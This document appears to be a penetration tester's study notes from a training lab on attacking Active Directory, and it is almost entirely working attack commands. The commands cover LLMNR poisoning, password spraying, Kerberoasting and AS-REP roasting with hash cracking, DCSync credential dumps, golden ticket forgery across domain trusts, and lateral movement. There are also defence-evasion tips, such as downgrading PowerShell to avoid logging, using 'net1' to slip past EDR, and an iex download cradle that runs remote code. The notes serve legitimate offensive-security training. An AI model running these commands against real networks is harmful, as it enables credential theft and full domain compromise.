## Initial Enumeration
``` bash
fping -asgq 172.16.5.0/23
sudo nmap -v -A -iL hosts.txt -oA outfile

kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```
___

## LLMNR/NBT-NS Poisoning
**Linux:**
``` bash
sudo responder -I <interface> -v -w -f
```
**Windows:**
- Use [Inveigh](https://github.com/Kevin-Robertson/Inveigh)
	- The powershell version is very outdated but the C# version requires compilation.
___

## Enumerating Password Policies
### Linux
**Credentialed**
``` bash
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

enum4linux-ng <IP> [-u USER] [-p PW] [-oA OUTFILE]

ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```
**Using rpcclient**
```
$ rpcclient -U "" -N 172.16.5.5 
rpcclient $> querydominfo 
rpcclient $> getdompwinfo
```

### Windows
```
net acounts  # Noisy
```
**Powerview**
``` powershell
Import-Module .\PowerView.ps1
Get-DomainPolicy
```

### Default Domain Password Policy
![[2023-04-18 18_42_05-Hack The Box - Academy.png|600]]
___

## Password Spraying

### Making Target User List

**Without Credentials**
``` bash
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

crackmapexec smb 172.16.5.5 --users

./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt | tee kerb.out | grep + | cut -c 50- | cut -d '@' -f 1 > users.list

ldapsearch -H 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

**With Credentials**
``` bash
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

### Linux - Password Spray
``` bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1

sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

# If admin creds found, look for Admin password reuse. --local-auth needed to only attempt once per machine to prevent admin lockout. Very noisy.
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

```

### Windows - Password Spray

[DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) or [Kerbrute](https://github.com/ropnop/kerbrute) windows version
``` powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
___

## Enumerating Security Controls
``` powershell
# Get status of defender
# Looking for AntispywareEnabled, AntivirusEnabled, BehaviorMonitorEnabled, RealTimeProtectionEnabled
Get-MpComputerStatus

# Applocker
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Powershell Language Mode Enumeration
$ExecutionContext.SessionState.LanguageMode
```

### LAPS

 [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) 
 ``` powershell
# See groups delegated to read LAPS passwords
Find-LAPSDelegatedGroups

# Extended rights users can read LAPS passwords and may be less protected than users in delegated groups
Find-AdmPwdExtendedRights

# See computers with LAPS enabled, password expiration date, and cleartext passwords if our user has privs
Get-LAPSComputers

```
___

## Credentialed Enumeration - from Linux

[Windapsearch](https://github.com/ropnop/windapsearch)

### Enumerate Users, Groups & Logged On Users
``` bash
# This info should already being gathered from enum4linux and enum4linux-ng
crackmapexec smb 10.10.10.10 --users [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u <username> -p <password>]

ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d " "

rpcclient -U "" -N 10.10.10.10
enumdomusers
enumdomgroups

# Impacket - Enumerate local users
lookupsid.py -no-pass hostname.local

# Metasploit - Enumerate local users
use auxiliary/scanner/smb/smb_lookupsid
set rhosts hostname.local
run

# Domain Admin Search
python3 windapsearch.py --dc-ip <IP> -u USER@DOMAIN -p PASS --da
# Privileged User Search
python3 windapsearch.py --dc-ip <IP> -u USER@DOMAIN -p PASS -PU

```

**Shares**
``` bash
smbclient --no-pass -L //<IP> # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash

smbmap -H <IP> [-P <PORT>] #Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
smbmap -R -u "username" -p "password" -H <IP> [-P <PORT>] #Recursive list

crackmapexec smb <IP> -u '' -p '' --shares #Null user
crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user

# Recursive Dir List
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only

sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

#### [Bloodhound.py](https://github.com/fox-it/BloodHound.py)
``` bash
sudo bloodhound-python -u 'USER' -p 'PASS' -ns <IP> -d DOMAIN -c all 
```
___

## Credentialed Enumeration from Windows

### [ActiveDirectory PowerShell Module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps)

#### Install
``` powershell
# Windows >10
Add-WindowsCapability -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0 -Online

# On Windows Server
Install-WindowsFeature -Name "RSAT-AD-PowerShell" -IncludeAllSubFeature

```

```powershell
# List modules
Get-Module 

#Import AD module
Import-Module -Name ActiveDirectory
```

#### Enumeration
``` powershell
# Get Domain Info
Get-ADDomain

# Get Accounts with SPNs
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Check Trust Relationships
Get-ADTrust -Filter *

# Groups
Get-ADGroup -Filter * | select name             # Group Enumeration
Get-ADGroup -Identity "Backup Operators"        # Detailed Group Info
Get-AdGroupMember - Identity "Backup Operators" # Group Membership
```

### [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)

[Docs](https://powersploit.readthedocs.io/en/latest/Recon/)

``` powershell

# Misc Functions

Export-PowerViewCSV # thread-safe CSV append 
Resolve-IPAddress # resolves a hostname to an IP 
ConvertTo-SID # converts a given user/group name to a security identifier (SID) 
Convert-ADName # converts object names between a variety of formats 
ConvertFrom-UACValue # converts a UAC int value to human readable form 
Add-RemoteConnection # pseudo "mounts" a connection to a remote path using the specified credential object 
Remove-RemoteConnection # destroys a connection created by New-RemoteConnection 
Invoke-UserImpersonation # creates a new "runas /netonly" type logon and impersonates the token 
Invoke-RevertToSelf # reverts any token impersonation 
Get-DomainSPNTicket # request the kerberos ticket for a specified service principal name (SPN) 
Invoke-Kerberoast # requests service tickets for kerberoast-able accounts and returns extracted ticket hashes 
Get-PathAcl # get the ACLs for a local/remote file path with optional group recursion


# Computer Enumeration

Get-NetLocalGroup # enumerates the local groups on the local (or remote) machine
Get-NetLocalGroupMember # enumerates members of a specific local group on the local (or remote) machine 
Get-NetShare # returns open shares on the local (or a remote) machine 
Get-NetLoggedon # returns users logged on the local (or a remote) machine 
Get-NetSession # returns session information for the local (or a remote) machine 
Get-RegLoggedOn # returns who is logged onto the local (or a remote) machine through enumeration of remote registry keys 
Get-NetRDPSession # returns remote desktop/session information for the local (or a remote) machine 
Test-AdminAccess # tests if the current user has administrative access to the local (or a remote) machine 
Get-NetComputerSiteName # returns the AD site where the local (or a remote) machine resides 
Get-WMIRegProxy # enumerates the proxy server and WPAD conents for the current user 
Get-WMIRegLastLoggedOn # returns the last user who logged onto the local (or a remote) machine 
Get-WMIRegCachedRDPConnection # returns information about RDP connections outgoing from the local (or remote) machine 
Get-WMIRegMountedDrive # returns information about saved network mounted drives for the local (or remote) machine 
Get-WMIProcess # returns a list of processes and their owners on the local or remote machine 
Find-InterestingFile # searches for files on the given path that match a series of specified criteria


# Domain/LDAP Functions

Get-DomainDNSZone # enumerates the Active Directory DNS zones for a given domain
Get-DomainDNSRecord # enumerates the Active Directory DNS records for a given zone
Get-Domain # returns the domain object for the current (or specified) domain 
Get-DomainController # return the domain controllers for the current (or specified) domain 
Get-Forest # returns the forest object for the current (or specified) forest 
Get-ForestDomain # return all domains for the current (or specified) forest 
Get-ForestGlobalCatalog # return all global catalogs for the current (or specified) forest 
Find-DomainObjectPropertyOutlier # Finds user/group/computer objects in AD that have 'outlier' properties set 
Get-DomainUser # return all users or specific user objects in AD 
New-DomainUser # creates a new domain user (assuming appropriate permissions) and returns the user object 
Get-DomainUserEvent # enumerates account logon events (ID 4624) and Logon with explicit credential events 
Get-DomainComputer # returns all computers or specific computer objects in AD 
Get-DomainObject # returns all (or specified) domain objects in AD 
Set-DomainObject # modifies a gven property for a specified active directory object 
Get-DomainObjectAcl # returns the ACLs associated with a specific active directory object 
Add-DomainObjectAcl # adds an ACL for a specific active directory object 
Find-InterestingDomainAcl # finds object ACLs in the current (or specified) domain with modification rights set to non-built in objects 
Get-DomainOU # search for all organization units (OUs) or specific OU objects in AD 
Get-DomainSite # search for all sites or specific site objects in AD 
Get-DomainSubnet # search for all subnets or specific subnets objects in AD 
Get-DomainSID # returns the SID for the current domain or the specified domain 
Get-DomainGroup # return all groups or specific group objects in AD 
New-DomainGroup # creates a new domain group (assuming appropriate permissions) and returns the group object 
Get-DomainManagedSecurityGroup # returns all security groups in the current (or target) domain that have a manager set 
Get-DomainGroupMember # return the members of a specific domain group 
Add-DomainGroupMember # adds a domain user (or group) to an existing domain group, assuming appropriate permissions to do so 
Get-DomainFileServer # returns a list of servers likely functioning as file servers 
Get-DomainDFSShare # returns a list of all fault-tolerant distributed file systems for the current (or specified) domain


# GPO Functions

Get-DomainGPO # returns all GPOs or specific GPO objects in AD 
Get-DomainGPOLocalGroup # returns all GPOs in a domain that modify local group memberships through 'Restricted Groups' or Group Policy preferences 
Get-DomainGPOUserLocalGroupMapping # enumerates the machines where a specific domain user/group is a member of a specific local group, all through GPO correlation 
Get-DomainGPOComputerLocalGroupMapping # takes a computer (or GPO) object and determines what users/groups are in the specified local group for the machine through GPO correlation 
Get-DomainPolicy # returns the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller


# Threaded Meta-Functions

Find-DomainUserLocation # finds domain machines where specific users are logged into 
Find-DomainProcess # finds domain machines where specific processes are currently running 
Find-DomainUserEvent # finds logon events on the current (or remote domain) for the specified users 
Find-DomainShare # finds reachable shares on domain machines 
Find-InterestingDomainShareFile # searches for files matching specific criteria on readable shares in the domain 
Find-LocalAdminAccess # finds machines on the local domain where the current user has local administrator access 
Find-DomainLocalGroupMember # enumerates the members of specified local group on machines in the domain


# Domain Trust Functions

Get-DomainTrust # returns all domain trusts for the current domain or a specified domain 
Get-ForestTrust # returns all forest trusts for the current forest or a specified forest 
Get-DomainForeignUser # enumerates users who are in groups outside of the user's domain 
Get-DomainForeignGroupMember # enumerates groups with users outside of the group's domain and returns each foreign member 
Get-DomainTrustMapping # this function enumerates all trusts for the current domain and then enumerates all trusts for each domain it finds

```

``` powershell
# Full User Information
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

# Recursive Group Membershi
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Test for Local Admin Access
Test-AdminAccess -ComputerName NAME

# Find Users with SPN Set
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

[SharpView](https://github.com/tevora-threat/SharpView) - dotNet port of PowerView, not updated since 2018

#### [Snaffler](https://github.com/SnaffCon/Snaffler)
``` cmd.exe
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```
- `-s` print to console
- `-d` domain
- `-o` outfile
- `-v` verbosity

### SharpHound
``` powershell
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```
___

# AD  Living off the Land

General Enumeration:
```powershell
hostname # PC Name
[System.Environment]::OSVersion.Version # OS version and revision level
wmic qfe get Caption,Description,HotFixID,InstalledOn # Patches and hotfixes
ipconfig /all # Network adapters
cmd.exe /c "set %USERDOMAIN%" # Domain name the host belongs to (Run from CMD)
cmd.exe /c "set %logonserver%" # Shows the DC the host checks in with (Run from CMD)

systeminfo # all of the above
```

Powershell Enumeration
``` powershell
Get-Module # Lists available modules
Get-ExecutionPolicy -List # Print the execution policy for each scope on a host
Set-ExecutionPolicy Bypass -Scope Process # Change the policy for the current process. ideal because the policy will revert once exited

Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt # Powershell History

Get-ChildItem Env: | ft Key,Value # Get environment vars: paths, users, etc

powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>" # basic download cradle
```

**Powershell Downgrade**
- Use an older version to bypass log events
	- The downgrade will be logged though
``` cmd
powershell.exe -version 2
```

**Enumerate Defenses**
``` powershell
netsh advfirewall show allprofiles # firewalls
cmd.exe /c "sc query windefend" # Win Defender from cmd

# Get detailed status of defender from powershell. Looking at AntispywareEnabled, AntivirusEnabled, BehaviorMonitorEnabled, RealTimeProtectionEnabled
Get-MpComputerStatus

qwinsta # Check active sessions
```

**Network Info**
``` powershell
arp -a
ipconfig /all
route print
netsh advfirewall show state
```

**WMI - [Cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4)**
``` powershell
wmic qfe get Caption,Description,HotFixID,InstalledOn # Patch level and hotfixes
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List # Basic host info including attributes
wmic process list /format:list	# Processes list
wmic ntdomain list /format:list	# Domain and DC info
wmic useraccount list /format:list	# Local accounts and logged in domain accounts
wmic group list /format:list	# Local group info
wmic sysaccount list /format:list	# Info on system accounts that are being used as service accounts
```


**Net Commands - noisy**

>Try using `net1` instead of `net` to bypass EDR

![[2023-04-19 18_19_11-Hack The Box - Academy.png|600]]

### [Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11))

- Command line tool to find AD objects.
    - The queries we run with this can be done easily in BloodHound or PowerView but this is a LOL alternative.
- Dsquery will exist on any host with the `Active Directory Domain Services Role` installed and the DLL exists on all modern Windows systems by default at `C:\Windows\System32\dsquery.dll`
``` powershell
dsquery user # list users
dsquery computer # list computers

dsquery * "CN=USERS,DC=DOMAIN,DC=LOCAL" # wildcard search for all objects in an OU

dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl # Use LDAP search filters. This finds users with PASSWD_NOTREQD

dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName # search for DCs (limit 5)
```
___

## Kerberoasting (Linux)

- Requires valid domain credentials and a DC IP.
``` bash
GetUserSPNs.py -dc-ip <IP> DOMAIN/user  # List SPN Accounts
GetUserSPNs.py -dc-ip <IP> DOMAIN/user -request # Request all TGS Tickets
GetUserSPNs.py -dc-ip <IP> DOMAIN/user -request-user otheruser # Req Single Ticket
# Request and save ticket to an output file
GetUserSPNs.py -dc-ip <IP> DOMAIN/user -request-user otheruser -outputfile file

# hashcat settings
hashcat -m 13100 hash /path/to/wordlist

# If found, test creds against DC
sudo crackmapexec smb <DC-IP> -u user -p crackedpass
```
___

## Kerberoasting (Windows)

### [[Active Directory#[PowerView](https //github.com/PowerShellMafia/PowerSploit/tree/master/Recon)|PowerView]]
``` powershell
Get-DomainUser * -spn | select samaccountname # Get SPN accounts
Get-DomainUser -Identity user | Get-DomainSPNTicket -Format Hashcat # Get single user ticket
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tickets.csv -NoTypeInformation # Get all Tickets and export to a CSV file
```

### [Rubeus](https://github.com/GhostPack/Rubeus)
```powershell
.\Rubeus.exe kerberoast /stats # Show Kerberoastable users and other info
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap # Roast admin accounts. nowrap helps with copy/paste
```

### Manual
**Enumerate SPNs with [setspn.exe](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11))**
```
setspn.exe -Q */*
```
- Returns all SPNs. We only need user accounts.

``` powershell
# Required Setup for both attacks
>Add-Type -AssemblyName System.IdentityModel

# Targets a single user
>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<user/host.domain.local FromSetSPN>"

# Retrieve All Tickets
>setspn.exe -T DOMAIN.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

```

- Tickets will be loaded into memory and can be extracted with mimikatz.
	- Use base64 for copy/pasting. Otherwise output will be `.kirbi` files directly
```
mimikatz # base64 /out:true

mimikatz # kerberos::list /export
```

``` bash
# Prepare the base64 blob for cracking
echo "<base64 blob>" |  tr -d \\n | tee encoded_file

# Place the output into a .kirbi file
cat encoded_file | base64 -d > out.kirbi

# Extract the Kerberos ticket using kirbi2john
python2.7 kirbi2john.py out.kirbi

# Clean up for hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > out_hashcat.13100

# Check before cracking
cat out_hashcat.13100 

# Crack with hashcat
hashcat -m 13100 out_hashcat.13100 /path/to/words
```
___

## ASREP-Roasting

- **Hashcat mode 18200**

- Used to get TGTs for accounts that do not require kerberos pre-auth.
``` powershell
# Enumerate DONT_REQ_PREAUTH (PowerView)
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# Retrieve AS-REP with Rubeus
.\Rubeus.exe asreproast /user:USER /nowrap /format:hashcat
```

``` bash
# Brute force AS-REP with Kerbrute
kerbrute userenum -d DOMAIN.local --dc <DC-IP> /opt/jsmith.txt 

# GetNPUsers method. Will work with a jsmith.txt wordlist but will throw errors
GetNPUsers.py DOMAIN.LOCAL/ -dc-ip <DC-IP> -no-pass -usersfile valid_ad_users 
```
___

## ACL Enumeration

### ACLs with BloodHound
- Gather data with Sharphound/bloodhound.py and import into BloodHound
- Set user we control as starting node
- Select `Node Info` tab and scroll to `Outbound Control Rights` and select `First Degree Object Control`
- `Transitive Object Control` lays out the path of controllable objects

### PowerView
``` powershell
# Setup and convert username to SID
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid OwnedUser

# Find all domain objects the user has rights over. Returns raw GUIDs.
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# GUID lookup
# Method 1
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

# Method 2
$guid= "<GUID>"

Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl

# Group Membership
# Method 1
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

# Method 2
$itgroupsid = Convert-NameToSid "GroupName"

Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
```

### LOL ACL Enumeration
####  [Get-ADUser](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?view=windowsserver2022-ps) (Not Efficient)
``` powershell
# Create List of Domain Users
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

# Loops over each domain user to see if our controlled account has rights over it
foreach($line in [System.IO.File]::ReadLines("C:\path\to\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match '<DOMAIN>\\<USER>'}}
```
___

## ACL Abuse (TBD)

[Bloodhound Edges Documentation](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)

``` powershell
# Create a SecureString
PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force 

# Create a PSCredential Object using the secure string
PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $SecPassword)
```
___
## Group Policy Object (GPO) Abuse
- Enumerate with PowerView, BloodHound,  [group3r](https://github.com/Group3r/Group3r), [ADRecon](https://github.com/sense-of-security/ADRecon), [PingCastle](https://www.pingcastle.com/)
``` powershell
# Enumerate GPO Names with PowerView
Get-DomainGPO |select displayname

# Enumerate GPO names with Group Policy Management Tools cmdlet
Get-GPO -All | Select DisplayName


# Enumerate Domain User GPO Rights
$sid=Convert-NameToSid "Domain Users"

Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

# Convert GPO GUID to Name
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```
We could use a tool such as [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) to take advantage of this GPO misconfiguration.

>When using a tool like this, we need to be careful because commands can be run that affect every computer within the OU that the GPO is linked to. If we found an editable GPO that applies to an OU with 1,000 computers, we would not want to make the mistake of adding ourselves as a local admin to that many hosts


___

## DCSync
- Request all passwords via the `DS-Replication-Get-Changes-All`
	- Replicating Directory Changes / Replicating Directory Changes All permission
		- Domain/Enterprise admins and default domain admins have this right by default.

#### View Replication Privs through ADSI Edit
![[Pasted image 20230424130506.png]]

``` powershell
# PowerView
# Use Get-DomainUser to view a user's group memberships
Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl

# Search for replication rights via sid (No PowerView)
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"

Get-ObjectAcl "DC=<DOMAIN>,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

#### DCSync Attack with secretsdump.py

``` bash
secretsdump.py -outputfile domain_hashes -just-dc DOMAIN/user@<DC-IP> 

# Other flags
-just-dc-ntlm # only NTLM hashes
-just-dc-user <user> # data on a specific user
-pwd-last-set # when password was last changed
-history # dump password history
-user-status # check if a user account is disabled
```

### DCSync Attack with Mimikatz
```
PS C:\htb> .\mimikatz.exe

mimikatz # lsadump::dcsync /domain:<DOMAIN>.LOCAL /user:<DOMAIN>\<user>
```
- With Mimikatz you can't dump all tickets, must target a single user.
	- If we target `krbtgt` we can create a golden ticket
___

## Lateral Movement Without Local Admin

- BloodHound edges that can allow lateral movement:
	- [CanRDP](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)
	- [CanPSRemote](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote)
	- [SQLAdmin](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)

### RDP

```powershell
# Enumerate users that can RDP to a host (PowerView)
Get-NetLocalGroupMember -ComputerName NAME -GroupName "Remote Desktop Users"
```

##### With BloodHound
- Does the Domain Users group have *local admin* or *execution rights* (RDP, WinRM) over one or more hosts?
- Analysis scans
	- `Find Workstations where Domain Users can RDP`
	- `Find Servers where Domain Users can RDP`

### WinRM
``` powershell
# Enumerate Remote Management Users Group (PowerView)
Get-NetLocalGroupMember -ComputerName NAME -GroupName "Remote Management Users"
```

##### Enumerate With BloodHound Custom Cypher Query
``` cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

##### WinRM from Windows
``` powershell
$password = ConvertTo-SecureString "PASSWORD" -AsPlainText -Force

$cred = new-object System.Management.Automation.PSCredential ("DOMAIN\user", $password)

Enter-PSSession -ComputerName NAME -Credential $cred
```

Use evil-winrm from linux

### SQL Server Admin

##### Enumerate With BloodHound Custom Cypher Query
``` cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

##### [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet) (Windows)
``` powershell
# Enumerate MSSQL Instances
Get-SQLInstanceDomain

# Authenticate and run SQL queries/OS commands
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

#### mssqlclient.py
``` bash
mssqlclient.py DOMAIN/user@<IP> -windows-auth

# enable_xp_cmdshell
# xp_cmdshell whoami /priv
```
___

# Attacking Child-Parent Domain Trusts From Windows

## Golden Ticket - Mimikatz

- To perfrom this attacking after compromising a child domain we need:
	- The KRBTGT hash for the child domain
	- The SID for the child domain
	- The name of a target user in the child domain (doesn't need to exist)
	- The FQDN of the child domain
	- The SID of the Eneterprise Admins group of the root domain

- This process will add a given groups permissions to any account we choose, currently existing or not.
#### Obtain KRBTGT Acct's NT hash using Mimikatz
```
 lsadump::dcsync /user:DOMAIN\krbtgt
```

``` powershell
# Get child domain SID (Powerview)
Get-DomainSID

# Get Enterprise Admins Group SID (Powerview)
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

# Get Enterprise Admins Group SID (ActiveDirectory Module)
Get-ADGroup -Identity "Enterprise Admins" -Server "DOMAIN.LOCAL"
```

#### Create Golden Ticket with Mimikatz
```
kerberos::golden /user:hacker /domain:child.domain.local /sid:<ChildDomainSID> /krbtgt:<KRBTGT-NT> /sids:<GROUP SID> /ptt
```
Verify ticket is in memory with `klist`

## Golden Ticket - Rubeus

Using the same enumeration info as above:
``` powershell
.\Rubeus.exe golden /rc4:<KRBTGT-NT> /domain:child.domain.local /sid:<ChildDomainSID> /sids:<GROUP SID> /user:hacker /ptt
```

___

# Attacking Child-Parent Domain Trusts From Linux

- To perfrom this attacking after compromising a child domain we need:
	- The KRBTGT hash for the child domain
	- The SID for the child domain
	- The name of a target user in the child domain (doesn't need to exist)
	- The FQDN of the child domain
	- The SID of the Eneterprise Admins group of the root domain

- This process will add a given groups permissions to any account we choose, currently existing or not.

## Manual

``` bash
# DCSync to get the krbtgt nt hash
secretsdump.py child.domain.local/owned_user@<CHILD-DC-IP> -just-dc-user DOMAIN/krbtgt

# Brute force domain SID from child DC
lookupsid.py child.domain.local/owned_user@<CHILD-DC-IP> | grep "Domain SID"

# Brute force group SID from parent DC
lookupsid.py child.domain.local/owned_user@<PARENT-DC-IP> | grep -B12 "Enterprise Admins"

# Construct golden ticket
ticketer.py -nthash <KRBTGT-NT> -domain child.domain.local -domain-sid <ChildDomainSID> -extra-sid <EnterpriseAdminSID> hackerUser

# The ticket will be saved as a ccache file. To use it for kerberos auth attempts
export KRB5CCNAME=hacker.ccache

# To use ticket with Impacket use the -k and -no-pass flags
psexec.py DOMAIN.LOCAL/hacker@dc01.domain.local -k -no-pass -target-ip <DCIP>
```

## Automated
``` bash
raiseChild.py -target-exec <DCIP> child.domain.local/owned_user
```
Beware running this in production environs!
___

# Attacking Cross-Forest Trusts from Windows

- If you can't escalate privs in the current domain it may be possible to obtain a Kerberos ticket and crack a has for an admin user in a trusted domain that has Domain/Enterprise Admin privs over both domains.

``` powershell
# Enumerate accounts for associated SPNs (PowerView)
Get-DomainUser -SPN -Domain TrustedDomain.local | select SamAccountName

# Enumerate discovered accounts group membership (PowerView)
Get-DomainUser -Domain TrustedDomain.local -Identity targetUser | select samaccountname,memberof

# Kerberoast with Rubeus and crack returned hash
.\Rubeus.exe kerberoast /domain:TrustedDomain.local /user:targetuser /nowrap
```

- Check for password reuse between admin accounts

- If we have admin in Domain A we should see if they are a user in Domain B
``` powershell
# Enumerate groups with users that do not belong to the domain (PowerView)
Get-DomainForeignGroupMember -Domain TrustedDomain.local

# This will return MemberName as SID. Use Convert-SidToName from powerview

# If we own an admin account that is a user in another domain we can attempt to check those credentials. If we can authenticate thats a quick win and verification
Enter-PSSession -ComputerName DC01.TrustedDomain.Local -Credential OtherDomain\administrator
```

___

# Attacking Cross-Forest Trusts from Linux

#### Cross-Forest Kerberoasting
``` bash
GetUserSPNs.py -target-domain TrustedDomain.local OtherDomain.local/owned_user

GetUserSPNs.py -request -target-domain TrustedDomain.local OtherDomain.local/owned_user -outputfile ticket.13100
```